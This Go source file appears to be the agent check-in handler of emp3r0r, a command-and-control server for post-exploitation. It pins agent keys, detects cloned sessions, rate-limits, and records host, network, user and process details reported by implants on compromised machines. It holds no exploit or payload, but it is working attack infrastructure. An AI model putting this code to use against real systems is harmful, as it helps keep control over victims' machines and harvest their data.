package server

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// rotationRateLimiter tracks key rotation timestamps per AgentUUID to prevent log flooding
var rotationRateLimiter sync.Map

// handleAgentCheckIn processes agent check-in requests.
func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
	// check if agent is already connected (duplicated checkin)
	// strictly by tag (token in URL)
	vars := mux.Vars(req)
	token := vars["token"]
	if token != "" && agents.IsAgentExistByUUID(token) {
		agent := agents.GetAgentByUUID(token)
		if agent != nil {
			if val, ok := live.AgentControlMap.Load(agent); ok {
				ctrl := val.(*live.AgentControl)
				if ctrl.Conn != nil {
					logging.Warningf("handleAgentCheckIn: %s already connected, refusing duplicated checkin", token)
					wrt.WriteHeader(http.StatusForbidden)
					return
				}
			}
		}
	}

	conn, err := h2conn.Accept(wrt, req)
	defer func() {
		_ = conn.Close()
		if logging.Level >= 4 {
			logging.Debugf("handleAgentCheckIn finished")
		}
	}()
	if err != nil {
		logging.Errorf("handleAgentCheckIn: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	// Global Encryption: Wrap connection
	secureConn := transport.NewSecureConn(conn)
	// target is a pointer to Emp3r0rAgent
	target := new(def.Emp3r0rAgent)
	in := cbor.NewDecoder(secureConn) // Use secureConn
	err = in.Decode(target)
	if err != nil {
		logging.Warningf("handleAgentCheckIn decode error: %v", err)
		return
	}
	// sanitize agent data
	agents.SanitizeAgentData(target)

	// SECURITY: Agent MUST provide its public key in every checkin
	// If missing, reject immediately - something is wrong (malicious, compromised, or misconfigured)
	if target.PublicKey == "" {
		logging.Warningf("handleAgentCheckIn: Agent %s provided no public key, rejecting", strconv.Quote(target.UUID))
		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
		return
	}

	// TOFU: Trust On First Use
	// If agent exists, verify with pinned key
	// If agent is new, verify with provided key and pin it
	isNew := true

	existingKey := ""
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		a := key.(*def.Emp3r0rAgent)
		if a.UUID == target.UUID {
			existingKey = a.PublicKey
			isNew = false
			return false // stop iteration
		}
		return true
	})

	// If not in memory, check if it exists in DB (Persistent Session)
	if isNew && agents.AgentDB != nil {
		storedAgent, err := agents.GetStoredAgent(target.UUID)
		if err != nil {
			logging.Errorf("handleAgentCheckIn: GetStoredAgent error: %v", err)
		}
		if storedAgent != nil {
			isNew = false
			existingKey = storedAgent.PublicKey
		}
	}

	if !isNew {
		// Existing agent: Check for key mismatch
		if existingKey != "" && target.PublicKey != existingKey {
			// KEY ROTATION DETECTED

			// Find if there is an active controller (Scenario A: Active Session)
			var activeCtrl *live.AgentControl
			live.AgentControlMap.Range(func(key, value interface{}) bool {
				a := key.(*def.Emp3r0rAgent)
				if a.UUID == target.UUID {
					activeCtrl = value.(*live.AgentControl)
					return false // stop iteration
				}
				return true
			})

			// Scenario A: Clone Attack (Parallel Session)
			if activeCtrl != nil && activeCtrl.Conn != nil {
				msg := fmt.Sprintf("CRITICAL SECURITY ALERT: Clone detected for %s! Active session has Key A, new request has Key B. Blocking.", target.UUID)
				logging.Errorf("%s", msg)
				operatorBroadcastPrintf(logging.ERROR, "%s", msg)
				wrt.WriteHeader(http.StatusForbidden)
				return
			}

			// Scenario B: Rotation Request
			// Check pending
			if _, pending := live.PendingKeyRotations.Load(target.UUID); pending {
				// Already pending, just block
				wrt.WriteHeader(http.StatusForbidden)
				return
			}

			// Create Request
			live.PendingKeyRotations.Store(target.UUID, target.PublicKey)

			msg := fmt.Sprintf("CRITICAL: Agent %s requests key rotation. Run 'forget_agent %s' to remove old record and allow re-registration.", target.UUID, strconv.Quote(target.UUID))
			logging.Warningf("%s", msg)
			operatorBroadcastPrintf(logging.WARN, "%s", msg)
			wrt.WriteHeader(http.StatusForbidden)
			return
		}
	}

	// CA signature already verified via HTTP headers in dispatcher
	target.From = req.RemoteAddr

	// Update agent in memory (dispatcher already created placeholder)
	// Find the placeholder and update it with full agent data from CBOR
	isAgentNew := false
	var existingCtrl *live.AgentControl
	live.AgentControlMap.Range(func(key, value interface{}) bool {
		a := key.(*def.Emp3r0rAgent)
		if a.UUID == target.UUID {
			existingCtrl = value.(*live.AgentControl)
			// Check if this is the placeholder (no public key yet) or a real agent
			if a.PublicKey == "" {
				isAgentNew = true
			}
			return false
		}
		return true
	})

	if isAgentNew || existingCtrl != nil {
		// Remove old entry (placeholder or existing agent)
		live.AgentControlMap.Range(func(key, value interface{}) bool {
			a := key.(*def.Emp3r0rAgent)
			if a.UUID == target.UUID {
				live.AgentControlMap.Delete(key)
				return false
			}
			return true
		})
		// Store updated agent with full data
		target.LastSeen = time.Now()
		if existingCtrl != nil {
			live.AgentControlMap.Store(target, existingCtrl)
		} else {
			inx := agents.AssignAgentIndex()
			live.AgentControlMap.Store(target, &live.AgentControl{Index: inx, Conn: nil})
		}
		logging.Infof("Updated agent %s with full data from CBOR (public key length=%d)", strconv.Quote(target.UUID), len(target.PublicKey))
		
		// Signal that public key is now available (for any waiting requests)
		if readyChanVal, exists := checkinReadyChannels.Load(target.UUID); exists {
			readyChan := readyChanVal.(chan struct{})
			close(readyChan)
			checkinReadyChannels.Delete(target.UUID)
			logging.Debugf("Signaled checkin completion for %s", strconv.Quote(target.UUID))
		}
	} else {
		// Existing agent - update it in memory NOW to ensure pubkey and info are available
		live.AgentControlMap.Range(func(key, value interface{}) bool {
			a := key.(*def.Emp3r0rAgent)
			ctrl := value.(*live.AgentControl)
			if a.UUID == target.UUID {
				// if agent is already connected, it must be the same instance
				if ctrl.Conn != nil {
					logging.Warningf("handleAgentCheckIn: %s just connected, but state says it is already connected. This implies a race condition or logic error.", target.Tag)
				}
				// Refresh all agent info to keep it current
				a.Name = target.Name
				a.Version = target.Version
				a.Transport = target.Transport
				a.Hostname = target.Hostname
				a.Hardware = target.Hardware
				a.Container = target.Container
				a.CPU = target.CPU
				a.GPU = target.GPU
				a.Mem = target.Mem
				a.OS = target.OS
				a.GOOS = target.GOOS
				a.Kernel = target.Kernel
				a.Arch = target.Arch
				a.From = target.From
				a.IPs = target.IPs
				a.ARP = target.ARP
				a.User = target.User
				a.HasRoot = target.HasRoot
				a.HasTor = target.HasTor
				a.HasInternet = target.HasInternet
				a.NCSIEnabled = target.NCSIEnabled
				a.Process = target.Process
				a.Exes = target.Exes
				a.CWD = target.CWD
				a.Product = target.Product
				// TOFU: Public key remains pinned for existing agents
				// Already validated against existing key in key rotation check
				if target.PublicKey != "" {
					a.PublicKey = target.PublicKey
				}
				a.LastSeen = time.Now()
				return false
			}
			return true
		})
	}

	// Now that agent is in memory with pubkey, safe to proceed with other operations
	// (message tunnel requests can now resolve the pubkey)

	// ------------------------------------------------------------ // SECURITY: DoS Protection (Rate Limiting)
	// ------------------------------------------------------------
	now := time.Now()
	// Prune old timestamps (> 1 minute)
	validTimestamps := []time.Time{}
	if val, exists := rotationRateLimiter.Load(target.UUID); exists {
		timestamps := val.([]time.Time)
		for _, t := range timestamps {
			if now.Sub(t) < time.Minute {
				validTimestamps = append(validTimestamps, t)
			}
		}
	}
	validTimestamps = append(validTimestamps, now)
	rotationRateLimiter.Store(target.UUID, validTimestamps)

	// Check limit (10 rotations per minute)
	if len(validTimestamps) > 10 {
		// Silent Drop: Stop processing to save CPU/Disk
		logging.Warningf("Rate limit exceeded for agent %s, dropping request", target.UUID)
		return
	}

	// ------------------------------------------------------------ // SECURITY: Clone Detection & Session Management
	// ------------------------------------------------------------
	// ------------------------------------------------------------ // DATABASE: Change Detection & Recording
	// ------------------------------------------------------------
	if agents.AgentDB != nil {
		// Detect changes before recording new data
		if err := agents.DetectAgentChanges(target); err != nil {
			logging.Warningf("Failed to detect agent changes: %v", err)
		}

		// Record check-in
		if err := agents.RecordAgentCheckin(target); err != nil {
			logging.Warningf("Failed to record agent check-in: %v", err)
		}
	}

	if isAgentNew {
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agents.AgentsJSON) {
			if l := agents.RefreshAgentLabel(target); l != "" {
				shortname = l
			}
		}
		logging.Infof("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
	} else {
		// Existing agent - refresh system info logging
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agents.AgentsJSON) {
			// Find the agent in memory to refresh label
			live.AgentControlMap.Range(func(key, value interface{}) bool {
				a := key.(*def.Emp3r0rAgent)
				if a.UUID == target.UUID {
					if l := agents.RefreshAgentLabel(a); l != "" {
						shortname = l
					}
					return false
				}
				return true
			})
		}
		if logging.Level >= 4 {
			logging.Debugf("Agent reconnected: %s from %s, running %s", shortname, fmt.Sprintf("%s - %s", target.From, target.Transport), strconv.Quote(target.OS))
		}
	}
}
